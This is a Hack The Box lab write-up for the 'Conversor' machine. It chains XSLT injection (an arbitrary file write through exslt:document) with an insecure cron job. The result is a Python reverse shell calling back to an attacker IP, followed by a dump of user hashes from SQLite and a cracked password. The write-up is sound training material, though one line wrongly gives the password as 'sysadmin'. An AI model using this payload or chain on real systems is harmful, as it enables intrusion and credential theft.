# HackTheBox: Conversor Writeup - Arbitrary File Write via XSLT Injection & Cron Job RCE
Machine: Conversor (Easy) Platform: Hack The Box Vulnerabilities: XSLT Injection, Arbitrary File Write, Insecure Cron Job, Cleartext Password Storage

## 1. Enumeration & Reconnaissance
We start by scanning the target IP 10.10.11.92 with Nmap to identify open ports and services.

```Bash

nmap -A 10.10.11.92
Nmap Output: The scan reveals two open ports:

22/tcp (SSH): OpenSSH 8.9p1

80/tcp (HTTP): Apache httpd 2.4.52
```
The scan also indicates a hostname that failed to resolve: conversor.htb.

DNS Configuration
To access the web application properly, we add the hostname to our /etc/hosts file:

```Bash

echo "10.10.11.92    conversor.htb" | sudo tee -a /etc/hosts
```
2. Web Application Analysis
Visiting http://conversor.htb, we find a file conversion service ("Conversor") that allows users to upload XML and XSLT files to convert data into a formatted report.

Navigating to the "About" page, we find a list of developers (FisMatHack, Arturo Vidal, David Ramos) and a link to download the source code.

Source Code Review
We download the source_code.tar.gz and extract it:

```Bash

tar -xvf source_code.tar.gz
```
Analyzing the source code reveals two critical findings:
## 1. The XSLT Parser Vulnerability (app.py) The application uses lxml to parse uploaded files. While the XML parser is secured against External Entity attacks (XXE), the XSLT parser is insecure.

```python

###  Secure XML Parser
parser = etree.XMLParser(resolve_entities=False, no_network=True, ...)
xml_tree = etree.parse(xml_path, parser)

###  Insecure XSLT Parser (Uses default configuration)
xslt_tree = etree.parse(xslt_path) 
transform = etree.XSLT(xslt_tree)
Because the XSLT parser uses the default configuration, it allows the use of extensions like EXSLT, which can be used to perform Arbitrary File Writes.
```

## 2. The Cron Job (install.md) Inside the install.md file, we find instructions that reveal a system cron job running as www-data:

"our server deletes all files older than 60 minutes to avoid system overload... add the following line to your /etc/crontab"

Bash

* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
This cron job executes any .py file found in /var/www/conversor.htb/scripts/ every minute.

3. Exploitation (RCE)
By chaining the Arbitrary File Write via XSLT with the Insecure Cron Job, we can write a malicious Python script into the scripts folder and wait for it to execute.

The Payload (write.xslt)
We craft a malicious XSLT file that uses the exslt:document function to write a file to the server.

Target Path: /var/www/conversor.htb/scripts/shell.py

Content: A Python reverse shell connecting to our attacker IP (10.10.14.72) on port 9001.

```XML

<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common" 
 extension-element-prefixes="exploit"
 version="1.0">
 
 <xsl:template match="/">
   <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.72",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>
```
We also need a valid dummy XML file (xml.xml) to pass the initial check:

```XML

<?xml version="1.0"?>
<data>test</data>
```
Execution
Start a Listener: We use rlwrap with netcat to catch the shell and improve stability.
<img width="512" height="103" alt="Conversor REverse_shell" src="https://github.com/user-attachments/assets/b2778975-1b7f-451d-b230-febf840bc060" />

```Bash

rlwrap -cAr nc -lvnp 9001
```
Upload: We log in to the web app (register a new user first) and upload xml.xml and our malicious write.xslt.

Wait: We click "Convert". The server parses the XSLT, which writes shell.py to the scripts directory.

Shell: Within 60 seconds, the cron job runs the script, and we receive a callback as www-data.

### 4. Privilege Escalation (User)
Now inside as www-data, we enumerate the file system. Checking the sudo -l permissions reveals we need a password.

Checking the /var/www/conversor.htb/ directory, we find a SQLite database at instance/users.db.

Dumping Hashes
We interact with the database to dump user credentials:

Bash

sqlite3 instance/users.db "SELECT * FROM users;"
Output:
<img width="408" height="215" alt="conversor_hasheds" src="https://github.com/user-attachments/assets/a483eb16-80fe-42db-9e4a-519c6d6b8080" />

```Bash

1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
...
```
Cracking the Hash
The user fismathack (User ID 1) has an MD5 hash. Using an online cracker (like CrackStation) or Hashcat:
```Bash 
Hash: 5b5c3ac3a1c897c94caad48e6c71fdec
```
Crack Result: Keepmesafeandwarm

Obtaining User Flag
With the password sysadmin, we can switch users to fismathack:
<img width="754" height="149" alt="conversor FismatHAckPermisiion" src="https://github.com/user-attachments/assets/e78f24ad-660c-4b3d-b4d8-af920dc0c81e" />

```Bash

su fismathack
#### Password: Keepmesafeandwarm
```
We can now read the user flag:

```Bash

cat /home/fismathack/user.txt
```
Pwned! 🚩
